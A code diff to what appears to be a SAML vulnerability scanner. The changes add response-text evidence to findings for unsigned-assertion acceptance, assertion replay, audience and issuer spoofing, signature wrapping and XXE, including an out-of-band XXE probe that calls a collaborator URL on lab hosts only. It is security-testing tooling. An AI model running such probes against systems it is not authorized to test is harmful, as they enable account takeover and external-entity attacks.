@@ -260,10 +260,21 @@ export async function postSamlResponse(acsUrl, samlResponse, opts = {}) {
 
 // Did the ACS grant a session for our canary? Session = session-like
 // Set-Cookie OR the canary NameID rendered in the body/location.
-function sessionGranted(r, canary) {
-  const cookieHit = /set-cookie/i.test('set-cookie') && /(session|sess|auth|token|sid)/i.test(r.setCookie) && r.setCookie.length > 10;
+export function sessionGranted(r, canary) {
+  const cookieHit = /(session|sess|auth|token|sid)/i.test(r.setCookie) && r.setCookie.length > 10;
   const canaryHit = (r.body + ' ' + r.location).includes(canary);
   return cookieHit || canaryHit;
+}
+
+// Window around the granted session's proof: the canary NameID rendered in
+// the body/location, else the session-cookie name (value redacted).
+function grantedWindow(r, canary) {
+  const hay = `${r.body || ''} ${r.location || ''}`;
+  const idx = hay.indexOf(canary);
+  if (idx >= 0) return hay.slice(Math.max(0, idx - 60), idx + 120);
+  const m = (r.setCookie || '').match(/^([^=;]+)=/);
+  if (m) return `Set-Cookie: ${m[1]}=<session>`;
+  return `status ${r.status}`;
 }
 
 // GET metadata discovery. Returns {acsUrl, entityId} or null.
@@ -381,7 +392,7 @@ export async function probeSaml(url, opts = {}) {
       url: acsUrl,
       parameter: 'SAMLResponse',
       evidence: evidenceBase(
-        `unsigned assertion (NameID=${canary}) → session granted (${rUnsigned.status}, cookie=${rUnsigned.setCookie.slice(0, 80)}); garbled-audience control → no session`,
+        `unsigned assertion (NameID=${canary}) → session granted (${rUnsigned.status}, cookie=${rUnsigned.setCookie.slice(0, 80)}); garbled-audience control → no session — "...${grantedWindow(rUnsigned, canary)}..."`,
         'Anyone can mint a SAMLResponse for any user — full account takeover, no credentials needed'
       ),
     });
@@ -394,7 +405,7 @@ export async function probeSaml(url, opts = {}) {
       url: acsUrl,
       parameter: 'SAMLResponse',
       evidence: evidenceBase(
-        'both valid-audience and garbled-audience assertions returned identical session signals — endpoint is not validating',
+        `both valid-audience (${rUnsigned.status}) and garbled-audience (${rGarbled.status}) assertions returned identical session signals — endpoint is not validating`,
         'No bypass proven; endpoint behavior noted for manual review'
       ),
     });
@@ -420,7 +431,7 @@ export async function probeSaml(url, opts = {}) {
           url: acsUrl,
           parameter: 'NotOnOrAfter',
           evidence: evidenceBase(
-            `2x expired assertion (NotOnOrAfter=${expired}) → both granted session for ${canary}`,
+            `2x expired assertion (NotOnOrAfter=${expired}) → both granted session for ${canary} — "...${grantedWindow(rE1, canary)}..."`,
             'Stolen assertions never expire — replayable indefinitely'
           ),
         });
@@ -437,7 +448,7 @@ export async function probeSaml(url, opts = {}) {
           url: acsUrl,
           parameter: 'Audience',
           evidence: evidenceBase(
-            'assertion for audience https://evil.example/ → session granted',
+            `assertion for audience https://evil.example/ → session granted — "...${grantedWindow(rAud, canary)}..."`,
             'Assertions minted for other apps are accepted here'
           ),
         });
@@ -479,7 +490,7 @@ export async function probeSaml(url, opts = {}) {
                 `control: single unsigned assertion for ${xswCanary} → rejected (${rCtl.status}); ` +
                 `attack: Response with OUR-RSA-signed dummy assertion (Reference URI → its own ID) + unsigned ` +
                 `canary assertion (signed-${signedFirst ? 'first' : 'last'} order) → session granted for the ` +
-                `UNSIGNED CANARY ${xswCanary} (${r.status}, cookie=${r.setCookie.slice(0, 80)})`,
+                `UNSIGNED CANARY ${xswCanary} (${r.status}, cookie=${r.setCookie.slice(0, 80)}) — "...${grantedWindow(r, xswCanary)}..."`,
                 'Attacker wraps any captured signed assertion around an arbitrary unsigned identity — account takeover without the IdP key'
               ),
             });
@@ -509,7 +520,7 @@ export async function probeSaml(url, opts = {}) {
           parameter: 'Issuer',
           evidence: evidenceBase(
             `unsigned assertion with Issuer=${meta.entityId} (spoofed trusted issuer) → session granted for ` +
-            `${issCanary} (${rT.status}); unsigned assertion with random issuer → rejected (${rR.status})`,
+            `${issCanary} (${rT.status}) — "...${grantedWindow(rT, issCanary)}..."; unsigned assertion with random issuer → rejected (${rR.status})`,
             'Anyone can mint unsigned assertions carrying the trusted issuer string — full account takeover'
           ),
         });
@@ -527,6 +538,8 @@ export async function probeSaml(url, opts = {}) {
       });
       const rX = await postSamlResponse(acsUrl, deflateB64(xxeXml), { timeoutMs });
       if ((rX.body || '').includes(xxeVal)) {
+        const xIdx = rX.body.indexOf(xxeVal);
+        const xWindow = rX.body.slice(Math.max(0, xIdx - 60), xIdx + 120);
         findings.push({
           class: 'saml_xxe_entities',
           id: `saml-xxe-${rand()}`,
@@ -536,7 +549,7 @@ export async function probeSaml(url, opts = {}) {
           parameter: 'SAMLResponse',
           evidence: evidenceBase(
             `unsigned assertion with <!ENTITY dmxxe "${xxeVal}"> referenced as &dmxxe; in NameID → response ` +
-            `reflected the EXPANDED value`,
+            `reflected the EXPANDED value — "...${xWindow}..."`,
             'Entity-processing parser on the auth endpoint: gateway to external-entity / file-disclosure XXE'
           ),
         });
@@ -549,7 +562,7 @@ export async function probeSaml(url, opts = {}) {
       if (opts.oobCallback && isLabHost(url, opts)) {
         const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/saml-xxe-${rand()}`;
         const xxeOobXml = buildXxeSamlResponse({ nameId: 'oob-probe', audience, externalUrl: oobUrl });
-        await postSamlResponse(acsUrl, deflateB64(xxeOobXml), { timeoutMs });
+        const rOob = await postSamlResponse(acsUrl, deflateB64(xxeOobXml), { timeoutMs });
         findings.push({
           class: 'saml_xxe_oob_sent',
           id: `saml-xxeoob-${rand()}`,
@@ -558,7 +571,7 @@ export async function probeSaml(url, opts = {}) {
           url: acsUrl,
           parameter: 'SAMLResponse',
           evidence: evidenceBase(
-            `external parameter entity → ${oobUrl} sent (canary URL only, no file targets); ` +
+            `external parameter entity → ${oobUrl} sent (status ${rOob.status}; canary URL only, no file targets); ` +
             `confirm out-of-band via the collaborator`,
             'An OOB hit proves external-entity resolution (blind XXE) on the ACS'
           ),
